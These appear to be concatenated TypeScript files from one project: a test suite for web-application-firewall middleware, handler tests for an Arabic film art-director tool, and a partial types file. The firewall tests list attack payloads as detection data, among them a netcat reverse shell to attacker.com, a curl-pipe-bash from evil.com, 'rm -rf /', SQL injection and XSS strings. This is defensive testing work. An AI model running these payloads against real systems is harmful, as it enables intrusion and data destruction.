// Helper to create mock request
function createMockRequest(overrides: Partial<Request> = {}): Request {
  return {
    method: "GET",
    path: "/api/test",
    originalUrl: "/api/test",
    body: {},
    query: {},
    headers: {
      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    },
    cookies: {},
    ip: "192.168.1.100",
    socket: { remoteAddress: "192.168.1.100" },
    get: vi.fn((header: string) => {
      if (header === "User-Agent") return overrides.headers?.["user-agent"] || "Mozilla/5.0";
      return undefined;
    }),
    ...overrides,
  } as unknown as Request;
}

// Helper to create mock response
function createMockResponse(): Response {
  const res = {
    status: vi.fn().mockReturnThis(),
    json: vi.fn().mockReturnThis(),
    setHeader: vi.fn().mockReturnThis(),
  };
  return res as unknown as Response;
}

describe("WAF Middleware", () => {
  beforeEach(() => {
    resetWAFConfig();
    clearAllRateLimits();
    // Clear blocked IPs
    getBlockedIPs().forEach((ip) => unblockIP(ip));
  });

  afterEach(() => {
    vi.clearAllMocks();
  });

  describe("Basic Functionality", () => {
    it("should allow legitimate requests", () => {
      const req = createMockRequest();
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(next).toHaveBeenCalled();
      expect(res["status"]).not.toHaveBeenCalled();
    });

    it("should skip WAF when disabled", () => {
      updateWAFConfig({ enabled: false });

      const req = createMockRequest({
        body: { input: "SELECT * FROM users" },
      });
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(next).toHaveBeenCalled();
    });

    it("should allow whitelisted paths", () => {
      updateWAFConfig({ mode: "block" });

      const req = createMockRequest({
        path: "/health",
        body: { input: "SELECT * FROM users" },
      });
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(next).toHaveBeenCalled();
    });

    it("should allow whitelisted IPs", () => {
      updateWAFConfig({ mode: "block" });

      const req = createMockRequest({
        ip: "127.0.0.1",
        socket: { remoteAddress: "127.0.0.1" },
        body: { input: "SELECT * FROM users" },
      } as Partial<Request>);
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(next).toHaveBeenCalled();
    });
  });

  describe("SQL Injection Detection", () => {
    const sqlInjectionPayloads = [
      "SELECT * FROM users WHERE id=1",
      "1' OR '1'='1",
      "1; DROP TABLE users--",
      "UNION SELECT username, password FROM users",
      "admin'--",
      "1' AND 1=1--",
      "'; EXEC xp_cmdshell('dir')--",
      "1' WAITFOR DELAY '0:0:10'--",
      "1' ORDER BY 1--",
      "BENCHMARK(10000000,SHA256('test'))",
    ];

    it.each(sqlInjectionPayloads)(
      "should detect SQL injection: %s",
      (payload) => {
        updateWAFConfig({ mode: "block" });

        const req = createMockRequest({
          body: { input: payload },
        });
        const res = createMockResponse();
        const next = vi.fn();

        wafMiddleware(req, res, next);

        expect(res["status"]).toHaveBeenCalledWith(403);
        expect(next).not.toHaveBeenCalled();
      }
    );

    it("should detect SQL injection in query parameters", () => {
      updateWAFConfig({ mode: "block" });

      const req = createMockRequest({
        query: { id: "1 OR 1=1" },
      });
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(res["status"]).toHaveBeenCalledWith(403);
    });
  });

  describe("XSS Detection", () => {
    const xssPayloads = [
      "<script>alert('xss')</script>",
      "<img src=x onerror=alert('xss')>",
      "javascript:alert('xss')",
      "<svg onload=alert('xss')>",
      "<body onload=alert('xss')>",
      "<iframe src='javascript:alert(1)'>",
      "<div style='background:url(javascript:alert(1))'>",
      "'-alert(1)-'",
      "<script src='https://evil.com/xss.js'></script>",
    ];

    it.each(xssPayloads)("should detect XSS attack: %s", (payload) => {
      updateWAFConfig({ mode: "block" });

      const req = createMockRequest({
        body: { input: payload },
      });
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(res["status"]).toHaveBeenCalledWith(403);
      expect(next).not.toHaveBeenCalled();
    });
  });

  describe("Command Injection Detection", () => {
    const commandInjectionPayloads = [
      "; cat /etc/passwd",
      "| ls -la",
      "`whoami`",
      "$(id)",
      "&& rm -rf /",
      "|| ping -c 10 evil.com",
      "; nc -e /bin/sh attacker.com 4444",
      "| curl https://evil.com/shell.sh | bash",
    ];

    it.each(commandInjectionPayloads)(
      "should detect command injection: %s",
      (payload) => {
        updateWAFConfig({ mode: "block" });

        const req = createMockRequest({
          body: { command: payload },
        });
        const res = createMockResponse();
        const next = vi.fn();

        wafMiddleware(req, res, next);

        expect(res["status"]).toHaveBeenCalledWith(403);
      }
    );
  });

  describe("Path Traversal Detection", () => {
    const pathTraversalPayloads = [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\config\\sam",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "....//....//....//etc/passwd",
      "/etc/passwd",
      "/proc/self/environ",
      "C:\\Windows\\System32\\",
    ];

    it.each(pathTraversalPayloads)(
      "should detect path traversal: %s",
      (payload) => {
        updateWAFConfig({ mode: "block" });

        const req = createMockRequest({
          path: `/api/files/${payload}`,
          originalUrl: `/api/files/${payload}`,
        });
        const res = createMockResponse();
        const next = vi.fn();

        wafMiddleware(req, res, next);

        expect(res["status"]).toHaveBeenCalledWith(403);
      }
    );
  });

  describe("Bot Detection", () => {
    const maliciousBots = [
      "sqlmap/1.0",
      "Nikto/2.1.5",
      "nmap scripting engine",
      "masscan/1.0",
      "gobuster/3.1",
      "nuclei/2.0",
    ];

    it.each(maliciousBots)("should detect malicious bot: %s", (botUA) => {
      updateWAFConfig({ mode: "block" });

      const req = createMockRequest({
        headers: { "user-agent": botUA },
      });
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(res["status"]).toHaveBeenCalledWith(403);
    });
  });

  describe("IP Blocking", () => {
    it("should block blacklisted IPs", () => {
      updateWAFConfig({ mode: "block" });
      blockIP("10.0.0.1", "Test block");

      const req = createMockRequest({
        ip: "10.0.0.1",
        socket: { remoteAddress: "10.0.0.1" },
      } as Partial<Request>);
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(res["status"]).toHaveBeenCalledWith(403);
      expect(next).not.toHaveBeenCalled();
    });

    it("should unblock IPs correctly", () => {
      updateWAFConfig({ mode: "block" });
      blockIP("10.0.0.2");
      unblockIP("10.0.0.2");

      const req = createMockRequest({
        ip: "10.0.0.2",
        socket: { remoteAddress: "10.0.0.2" },
      } as Partial<Request>);
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(next).toHaveBeenCalled();
    });

    it("should return blocked IPs list", () => {
      blockIP("10.0.0.3");
      blockIP("10.0.0.4");

      const blockedIPs = getBlockedIPs();

      expect(blockedIPs).toContain("10.0.0.3");
      expect(blockedIPs).toContain("10.0.0.4");
    });
  });

  describe("Rate Limiting", () => {
    it("should enforce rate limits", () => {
      updateWAFConfig({
        mode: "block",
        rateLimit: {
          windowMs: 60000,
          maxRequests: 3,
          blockDurationMs: 60000,
        },
      });

      const res = createMockResponse();
      const next = vi.fn();

      // First 3 requests should pass
      for (let i = 0; i < 3; i++) {
        const req = createMockRequest({ ip: "192.168.1.50" });
        wafMiddleware(req, res, next);
      }

      expect(next).toHaveBeenCalledTimes(3);

      // 4th request should be blocked
      const req = createMockRequest({ ip: "192.168.1.50" });
      wafMiddleware(req, res, next);

      expect(res["status"]).toHaveBeenCalledWith(429);
    });

    it("should clear rate limit for specific IP", () => {
      updateWAFConfig({
        mode: "block",
        rateLimit: {
          windowMs: 60000,
          maxRequests: 2,
          blockDurationMs: 60000,
        },
      });

      // Exceed rate limit
      for (let i = 0; i < 5; i++) {
        const req = createMockRequest({ ip: "192.168.1.60" });
        const res = createMockResponse();
        wafMiddleware(req, res, vi.fn());
      }

      // Clear rate limit
      clearRateLimit("192.168.1.60");

      // Should be allowed again
      const req = createMockRequest({ ip: "192.168.1.60" });
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(next).toHaveBeenCalled();
    });
  });

  describe("Custom Rules", () => {
    it("should add and enforce custom rules", () => {
      updateWAFConfig({ mode: "block" });

      const customRule: WAFRule = {
        id: "CUSTOM001",
        name: "Block Test Pattern",
        description: "Blocks requests containing 'forbidden-word'",
        pattern: /forbidden-word/gi,
        locations: ["body"],
        action: "block",
        severity: "high",
        enabled: true,
      };

      addCustomRule(customRule);

      const req = createMockRequest({
        body: { text: "This contains forbidden-word in it" },
      });
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(res["status"]).toHaveBeenCalledWith(403);
    });

    it("should remove custom rules", () => {
      updateWAFConfig({ mode: "block" });

      const customRule: WAFRule = {
        id: "CUSTOM002",
        name: "Temporary Block",
        description: "Temporary rule",
        pattern: /temp-block/gi,
        locations: ["body"],
        action: "block",
        severity: "medium",
        enabled: true,
      };

      addCustomRule(customRule);
      removeCustomRule("CUSTOM002");

      const req = createMockRequest({
        body: { text: "temp-block" },
      });
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(next).toHaveBeenCalled();
    });
  });

  describe("Monitor Mode", () => {
    it("should log but not block in monitor mode", () => {
      updateWAFConfig({ mode: "monitor" });

      const req = createMockRequest({
        body: { input: "SELECT * FROM users" },
      });
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(next).toHaveBeenCalled();
      expect(res["status"]).not.toHaveBeenCalled();
    });
  });

  describe("WAF Events and Stats", () => {
    it("should record WAF events", () => {
      updateWAFConfig({ mode: "block" });

      const req = createMockRequest({
        body: { input: "SELECT * FROM users" },
      });
      const res = createMockResponse();

      wafMiddleware(req, res, vi.fn());

      const events = getWAFEvents(10);
      expect(events.length).toBeGreaterThan(0);
      expect(events[events.length - 1].eventType).toBe("SQL_INJECTION");
    });

    it("should provide WAF statistics", () => {
      updateWAFConfig({ mode: "block" });

      // Generate some events
      const payloads = [
        { input: "SELECT * FROM users" },
        { input: "<script>alert(1)</script>" },
        { input: "'; DROP TABLE users--" },
      ];

      payloads.forEach((body) => {
        const req = createMockRequest({ body });
        const res = createMockResponse();
        wafMiddleware(req, res, vi.fn());
      });

      const stats = getWAFStats();

      expect(stats.totalEvents).toBeGreaterThan(0);
      expect(stats.blockedRequests).toBeGreaterThan(0);
    });
  });

  describe("Configuration Management", () => {
    it("should update WAF configuration", () => {
      updateWAFConfig({
        enabled: true,
        mode: "monitor",
        logLevel: "verbose",
      });

      const config = getWAFConfig();

      expect(config.enabled).toBe(true);
      expect(config.mode).toBe("monitor");
      expect(config.logLevel).toBe("verbose");
    });

    it("should reset to default configuration", () => {
      updateWAFConfig({
        mode: "monitor",
        logLevel: "verbose",
      });

      resetWAFConfig();

      const config = getWAFConfig();
      expect(config.logLevel).toBe("standard");
    });
  });

  describe("Pattern Validation", () => {
    it("should have valid SQL injection patterns", () => {
      expect(WAF_PATTERNS.SQL_INJECTION.length).toBeGreaterThan(0);
      WAF_PATTERNS.SQL_INJECTION.forEach((rule) => {
        expect(rule.pattern).toBeInstanceOf(RegExp);
        expect(rule.id).toBeDefined();
        expect(rule.severity).toBeDefined();
      });
    });

    it("should have valid XSS patterns", () => {
      expect(WAF_PATTERNS.XSS.length).toBeGreaterThan(0);
      WAF_PATTERNS.XSS.forEach((rule) => {
        expect(rule.pattern).toBeInstanceOf(RegExp);
        expect(rule.id).toBeDefined();
      });
    });

    it("should have valid command injection patterns", () => {
      expect(WAF_PATTERNS.COMMAND_INJECTION.length).toBeGreaterThan(0);
    });

    it("should have valid path traversal patterns", () => {
      expect(WAF_PATTERNS.PATH_TRAVERSAL.length).toBeGreaterThan(0);
    });
  });

  describe("Edge Cases", () => {
    it("should handle empty request body", () => {
      updateWAFConfig({ mode: "block" });

      const req = createMockRequest({ body: {} });
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(next).toHaveBeenCalled();
    });

    it("should handle null/undefined values", () => {
      updateWAFConfig({ mode: "block" });

      const req = createMockRequest({
        body: null,
        query: undefined,
      } as Partial<Request>);
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(next).toHaveBeenCalled();
    });

    it("should handle very long payloads", () => {
      updateWAFConfig({ mode: "block" });

      const longPayload = "SELECT ".repeat(10000) + "* FROM users";
      const req = createMockRequest({
        body: { input: longPayload },
      });
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(res["status"]).toHaveBeenCalledWith(403);
    });

    it("should handle X-Forwarded-For header for IP detection", () => {
      updateWAFConfig({ mode: "block" });
      blockIP("203.0.113.1");

      const req = createMockRequest({
        headers: {
          "x-forwarded-for": "203.0.113.1, 198.51.100.1",
          "user-agent": "Mozilla/5.0",
        },
      });
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(res["status"]).toHaveBeenCalledWith(403);
    });
  });

  describe("False Positive Prevention", () => {
    const legitimatePayloads = [
      "I want to select the best option from the list",
      "The user dropped their phone",
      "Insert the key into the lock",
      "Update your profile settings",
      "Delete old files from downloads",
      "This is a script for a movie",
      "Click here for more information",
      "The image source is correct",
    ];

    it.each(legitimatePayloads)(
      "should allow legitimate content: %s",
      (payload) => {
        updateWAFConfig({ mode: "block" });

        const req = createMockRequest({
          body: { description: payload },
        });
        const res = createMockResponse();
        const next = vi.fn();

        wafMiddleware(req, res, next);

        expect(next).toHaveBeenCalled();
      }
    );
  });
});

import { rm } from "node:fs/promises";
import path from "node:path";
import { beforeEach, describe, expect, it } from "vitest";

import type { ArtDirectorHandlerResponse } from "../handlers";
import { handleArtDirectorRequest } from "../handlers";
import { resetStoreForTests } from "../store";

const storePath = path.join(
  process.cwd(),
  ".tmp-tests",
  "art-director-store.test.json"
);

async function request(params: {
  method: "GET" | "POST";
  path: string[];
  body?: unknown;
  searchParams?: URLSearchParams;
}): Promise<ArtDirectorHandlerResponse> {
  return handleArtDirectorRequest({
    searchParams: new URLSearchParams(),
    ...params,
  });
}

beforeEach(async () => {
  process.env['ART_DIRECTOR_STORE_PATH'] = storePath;
  await rm(path.dirname(storePath), { recursive: true, force: true });
  await resetStoreForTests();
});

describe("art-director handlers", () => {
  it("يسجل موقعًا جديدًا ثم يعيده في البحث", async () => {
    const addResult = await request({
      method: "POST",
      path: ["locations", "add"],
      body: {
        name: "Baron Palace",
        nameAr: "قصر البارون",
        type: "interior",
        address: "Heliopolis, Cairo",
        features: ["إضاءة طبيعية", "حديقة"],
      },
    });

    expect(addResult["status"]).toBe(200);
    expect(addResult.body.success).toBe(true);

    const searchResult = await request({
      method: "POST",
      path: ["locations", "search"],
      body: { query: "البارون" },
    });

    expect(searchResult["status"]).toBe(200);
    expect(searchResult.body.success).toBe(true);
    expect(searchResult.body.data).toMatchObject({
      count: 1,
      locations: [
        {
          nameAr: "قصر البارون",
          type: "interior",
        },
      ],
    });
  });

  it("يرفض تسجيل الوقت عندما تكون الساعات غير صالحة", async () => {
    const result = await request({
      method: "POST",
      path: ["productivity", "log-time"],
      body: {
        task: "مراجعة لوحة الألوان",
        hours: 0,
        category: "design",
      },
    });

    expect(result["status"]).toBe(400);
    expect(result.body).toMatchObject({
      success: false,
      error: "عدد الساعات يجب أن يكون أكبر من صفر",
    });
  });

  it("ينشئ كتاب إنتاج ثم يصدّره بصيغة قابلة للتنزيل", async () => {
    const generateResult = await request({
      method: "POST",
      path: ["documentation", "generate"],
      body: {
        projectName: "Desert Echoes",
        projectNameAr: "أصداء الصحراء",
        director: "Lina Hassan",
        productionCompany: "The Copy Studios",
      },
    });

    expect(generateResult["status"]).toBe(200);
    expect(generateResult.body.success).toBe(true);

    const exportResult = await request({
      method: "POST",
      path: ["documentation", "export"],
      body: {
        format: "markdown",
      },
    });

    expect(exportResult["status"]).toBe(200);
    expect(exportResult.body.success).toBe(true);
    expect(exportResult.body.data).toMatchObject({
      format: "markdown",
      mimeType: "text/markdown;charset=utf-8",
    });
    expect(exportResult.body.data).toHaveProperty("filename");
    expect(exportResult.body.data).toHaveProperty("content");
    expect(
      String((exportResult.body.data as { content: string }).content)
    ).toContain("أصداء الصحراء");
  });

  it("يعيد 404 عند طلب مسار غير مدعوم", async () => {
    const result = await request({
      method: "GET",
      path: ["unknown", "route"],
    });

    expect(result["status"]).toBe(404);
    expect(result.body).toMatchObject({
      success: false,
      error: "المسار غير مدعوم: unknown/route",
    });
  });
});

/**
 * CineArchitect AI - Core Types
 * أنواع البيانات الأساسية لنظام CineArchitect
 *
 * @description هذا الملف يحتوي على جميع الأنواع والواجهات المستخدمة في التطبيق
 * لضمان Type Safety وتوحيد البيانات عبر المكونات المختلفة
 */

import { z } from "zod";

// ==================== Zod Schemas ====================
// مخططات Zod للتحقق من صحة البيانات في وقت التشغيل

/**
 * مخطط فئات الإضافات
 * يحدد الفئات المسموح بها للإضافات في النظام
 */
export const PluginCategorySchema = z.enum([
  "ai-analytics", // أدوات الذكاء الاصطناعي التحليلية
  "collaboration", // أدوات التعاون
  "resource-management", // إدارة الموارد
  "xr-immersive", // الواقع الممتد
  "learning", // التعلم والمعرفة
  "sustainability", // الاستدامة
  "documentation", // التوثيق
  "safety", // الأمان
  "marketing", // التسويق
]);

/**
 * مخطط بيانات الإضافة المدخلة
 * يتحقق من صحة البيانات المرسلة إلى الإضافة
 */
export const PluginInputSchema = z.object({
  type: z.string().min(1, "نوع المدخل مطلوب"),
  data: z.record(z.unknown()),
  options: z.record(z.unknown()).optional(),
});

/**
 * مخطط نتيجة تنفيذ الإضافة
 * يتحقق من صحة البيانات المرجعة من الإضافة
 */
export const PluginOutputSchema = z.object({
  success: z.boolean(),
  data: z.record(z.unknown()).optional(),
  error: z.string().optional(),
  warnings: z.array(z.string()).optional(),
});

/**
 * مخطط معلومات الإضافة الأساسية
 * يستخدم للتحقق من بيانات الإضافة المسترجعة من API
 */
export const PluginInfoSchema = z.object({
  id: z.string().min(1, "معرف الإضافة مطلوب"),
  name: z.string().min(1, "اسم الإضافة مطلوب"),
  nameAr: z.string().min(1, "الاسم العربي مطلوب"),
  version: z.string().optional(),
  category: z.string(),
});

/**
 * مخطط استجابة API للإضافات
 */
export const PluginsApiResponseSchema = z.object({
  plugins: z.array(PluginInfoSchema).optional(),
  success: z.boolean().optional(),
  error: z.string().optional(),
});

// ==================== Type Definitions ====================
// تعريفات الأنواع المشتقة من مخططات Zod

export type PluginCategory = z.infer<typeof PluginCategorySchema>;
export type PluginInput = z.infer<typeof PluginInputSchema>;
export type PluginOutput = z.infer<typeof PluginOutputSchema>;
export type PluginInfo = z.infer<typeof PluginInfoSchema>;
export type PluginsApiResponse = z.infer<typeof PluginsApiResponseSchema>;

/**
 * واجهة الإضافة الكاملة
 * تمثل إضافة قابلة للتنفيذ في النظام
 *
 * @property id - المعرف الفريد للإضافة
 * @property name - الاسم بالإنجليزية
 * @property nameAr - الاسم بالعربية
 * @property version - رقم الإصدار
 * @property description - الوصف بالإنجليزية
 * @property descriptionAr - الوصف بالعربية
 * @property category - فئة الإضافة
 */
export interface Plugin {
  id: string;
  name: string;
  nameAr: string;
  version: string;
  description: string;
  descriptionAr: string;
  category: PluginCategory;
  initialize(): Promise<void>;
  execute(input: PluginInput): Promise<PluginOutput>;
  shutdown(): Promise<void>;
}

// ==================== Project Types ====================
// أنواع المشاريع والمشاهد

/**
 * واجهة المشروع
 * تمثل مشروع إنتاج سينمائي كامل
 */
export interface Project {
  id: string;
  name: string;
  nameAr: string;
  description: string;
  createdAt: Date;
  updatedAt: Date;
  scenes: Scene[];
  budget: Budget;
  team: TeamMember[];
  locations: Location[];
  assets: Asset[];
}

/**
 * واجهة المشهد
 * تمثل مشهد واحد في المشروع
 */
export interface Scene {
  id: string;
  number: number;
  name: string;
  description: string;
  location: string;
  timeOfDay: "day" | "night" | "dawn" | "dusk";
  characters: string[];
  props: string[];
  notes: string;
  colorPalette?: ColorPalette;
  lightingSetup?: LightingSetup;
}

/**
 * واجهة لوحة الألوان
 * تحدد نظام الألوان المستخدم في المشهد
 */
export interface ColorPalette {
  primary: string[];
  secondary: string[];
  accent: string[];
  mood: string;
}

/**
 * واجهة إعداد الإضاءة
 * تحدد تكوين الإضاءة للمشهد
 */
export interface LightingSetup {
  type: "natural" | "artificial" | "mixed";
  keyLight?: Light;
  fillLight?: Light;
  backLight?: Light;
  practicals?: Light[];
  notes: string;
}

/**
 * واجهة مصدر الضوء
 * تمثل خصائص مصدر ضوء واحد
 */
export interface Light {
  type: string;
  intensity: number;
  colorTemperature: number;
  position: string;
}

// ==================== Budget Types ====================
// أنواع الميزانية

/**
 * واجهة الميزانية
 * تمثل ميزانية المشروع الكاملة
 */
export interface Budget {
  total: number;
  currency: string;
  categories: BudgetCategory[];
  spent: number;
  remaining: number;
}

/**
 * واجهة فئة الميزانية
 * تمثل تخصيص ميزانية لفئة معينة
 */
export interface BudgetCategory {
  name: string;
  nameAr: string;
  allocated: number;
  spent: number;
}

// ==================== Team Types ====================
// أنواع الفريق

/**
 * واجهة عضو الفريق
 * تمثل معلومات عضو واحد في فريق الإنتاج
 */
export interface TeamMember {
  id: string;
  name: string;
  role: string;
  roleAr: string;
  department: string;
  email: string;
  phone?: string;
}

// ==================== Location Types ====================
// أنواع المواقع

/**
 * مخطط الموقع للتحقق من صحة البيانات
 */
export const LocationSchema = z.object({
  id: z.string(),
  name: z.string(),
  nameAr: z.string(),
  type: z.string(),
  address: z.string(),
  features: z.array(z.string()).optional(),
});

/**
 * واجهة الموقع (بسيطة)
 * تستخدم في عرض قائمة المواقع
 */
export interface LocationSimple {
  id: string;
  name: string;
  nameAr: string;
  type: string;
  address: string;
  features: string[];
}

/**
 * واجهة الموقع (كاملة)
 * تمثل معلومات موقع تصوير كاملة
 */
export interface Location {
  id: string;
  name: string;
  address: string;
  type: "studio" | "outdoor" | "interior" | "exterior";
  availability: DateRange[];
  permits: Permit[];
  photos: string[];
  notes: string;
}

/**
 * واجهة نطاق التاريخ
 */
export interface DateRange {
  start: Date;
  end: Date;
}

/**
 * واجهة التصريح
 */
export interface Permit {
  type: string;
  status: "pending" | "approved" | "denied";
  expiresAt?: Date;
}

// ==================== Asset Types ====================
// أنواع الأصول والديكور

/**
 * مخطط قطعة الديكور للتحقق من صحة البيانات
 */
export const SetPieceSchema = z.object({
  id: z.string(),
  name: z.string(),
  nameAr: z.string(),
  category: z.string(),
  condition: z.string(),
  reusabilityScore: z.number().min(0).max(100),
});

/**
 * واجهة قطعة الديكور
 */
export interface SetPiece {
  id: string;
  name: string;
  nameAr: string;
  category: string;
  condition: string;
  reusabilityScore: number;
}

/**
 * واجهة الأصل
 * تمثل قطعة من قطع الإنتاج
 */
export interface Asset {
  id: string;
  name: string;
  type: "prop" | "costume" | "set-piece" | "vehicle" | "equipment";
  status: "available" | "in-use" | "maintenance" | "retired";
